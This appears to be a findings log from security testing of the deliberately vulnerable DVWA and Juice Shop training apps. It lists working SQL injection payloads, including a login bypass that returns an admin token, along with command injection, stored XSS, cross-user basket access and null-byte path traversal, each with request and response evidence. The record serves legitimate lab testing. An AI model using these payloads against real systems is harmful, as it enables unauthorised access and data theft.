findings.title: DVWA SQL Injection (id parameter, GET /vulnerabilities/sqli/) [security=low]
findings.response_evidence: [security=low] TRUE payload 1' OR '1'='1 returned 5 records: ID: 1' OR '1'='1 First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload 1' AND '1'='2 returned zero records (the 'User ID:' output block is empty, no 'First name'/'Surname' rows). Surnames recorded: admin, Brown, Me, Picasso, Smith. Session security_level=low.

findings.title: DVWA OS Command Injection (ip parameter, POST /vulnerabilities/exec/) [security=low]
findings.response_evidence: [security=low] Response contains ping output for 127.0.0.1 (4 packets transmitted, 4 received, 0% packet loss) followed by the injected command output on its own line: 'www-data' (appears directly before 'More Information'). Session security_level=low.

findings.title: DVWA Stored XSS (mtxMessage, POST /vulnerabilities/xss_s/) [security=low]
request_sequence: POST /vulnerabilities/xss_s/ form txtName='vfy', mtxMessage='<script id="test_token">window.xss_flag=1</script>' (52 chars, full canary sent over HTTP; client-side maxlength=50 not enforced server-side), btnSign='Sign Guestbook' [security=low]
findings.response_evidence: [security=low] POST accepted (HTTP 200) and the canary was stored without truncation: the rendered guestbook shows 'Name: vfy' with the stored script. The rendering page loaded in a dvwa_admin browser session shows document.getElementById('test_token').outerHTML = '<script id="test_token">window.xss_flag=1</script>' and window.xss_flag evaluates to 1. Note: the guestbook now contains the test entries 'vfy' and the canary.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/:id
findings.response_evidence: acct1 (own_basket_id=6) baseline: 200 {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"BasketId":6,"id":9,"quantity":3}}]}}. acct2 (acct2_bench@juiceshop.local, own_basket_id=7) requesting basket 6: 200 with identical body, i.e. acct1's basket owned by UserId 22 returned to a different user, containing Apple Juice (1000ml) quantity 3 (BasketItem id 9). No ownership check enforced.

findings.title: Confidential document exposed via open /ftp/ directory listing (acquisitions.md)
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (unauth, raw path; null-byte bypass not attempted)
findings.response_evidence: Listing at /ftp/ (200, unauthenticated) shows "acquisitions.md 909" among files. Direct GET /ftp/acquisitions.md returned 200 text/markdown with: "# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..." Also observed: GET /ftp/package.json.bak returned 403 "Error: Only .md and .pdf files are allowed!" (raw-path filter; bypass not tested in this pass).

findings.title: Basket 7 (acct2 own basket) - baseline only, not separately tested
request_sequence: No requests issued for /rest/basket/7; acct2 own_basket_id=7 was observed in session_info of the /rest/basket/6 check
findings.response_evidence: Basket 7 is acct2's own basket and serves only as the baseline for the BOLA check on basket 6 (the acct2 session_info reported own_basket_id=7). No cross-user access was tested against basket 7 itself, so no separate verdict is supported. The BOLA on the basket route is recorded under /rest/basket/6.

findings.title: Login authentication bypass via SQL injection in email field (admin token returned)
request_sequence: POST http://juiceshop:3000/rest/user/login  (session=unauth)  Content-Type: application/json  body: {"email": "' OR 1=1--", "password": "x"}
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid JWT was issued for the first user (admin@juice-sh.op) with an arbitrary password, which is the login-bypass criterion.

findings.title: Product search SQL injection (SQLITE_ERROR on quote; 9-column UNION data injection)
findings.response_evidence: Baseline q=apple: HTTP 200 {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":24,"name":"Apple Pomace",...}]} (no error). Error probe q=qwert': HTTP 500 text/html "Error: SQLITE_ERROR: near \"'%'\": syntax error". UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. The injected column values appear in the response, confirming attacker-controlled SQL with a successful UNION.

findings.title: Unauthenticated feedback listing returns records with only masked author emails (PII exposure not confirmed)
findings.response_evidence: HTTP 200 application/json without authentication: {"status":"success","data":[{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)","rating":5,...},{"UserId":2,"id":2,"comment":"Great shop! Awesome service! (***@juice-sh.op)",...},{"UserId":3,...,"comment":"Nothing useful available here! (***der@juice-sh.op)",...},{"UserId":21,...,"comment":"... (***ereum@juice-sh.op)",...},{"UserId":null,...,"comment":"... (anonymous)"},...] (8 records). Records are returned unauthenticated and the comments contain author email fragments, but the addresses are masked (***). No dedicated email field exists, and the full address is not disclosed. The records are unauthenticated, but the PII criterion (disclosed author email addresses) is only partially met, so the verdict is inconclusive rather than confirmed. A full address would need a different source, such as the user endpoint or unmasked comments.

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve package.json.bak
findings.response_evidence:
Raw path: HTTP 403 body 'Error: Only .md and .pdf files are allowed!' (fileServer.js verify). Null-byte bypass: HTTP 200, content_type application/octet-stream, body excerpt: '{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {"body-parser": "~1.18", ...}'. Both observations captured: restricted backup file served via %2500 bypass.

findings.title: Exposed encryption-keys directory is browsable and lists premium.key and jwt.pub
findings.response_evidence: HTTP 200 text/html. Visible text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links: /encryptionkeys/jwt.pub and /encryptionkeys/premium.key. Directory is browsable without authentication and exposes both sensitive key files.

request_sequence: GET http://juiceshop:3000/ftp/ with headers Accept: text/html,application/json (unauth) -> 200 text/html
findings.response_evidence: HTTP 200 text/html. Visible text: 'listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 ... announcement_encrypted.md 369237 ... coupons_2013.md.bak 131 ... eastere.gg 324 ... encrypt.pyc 573 ... incident-support.kdbx 3246 ... legal.md 3047 ... package.json.bak 4291 ... suspicious_errors.yml 723'. Supporting observation only for the existing CWE-200 finding on acquisitions.md (not re-verified here).
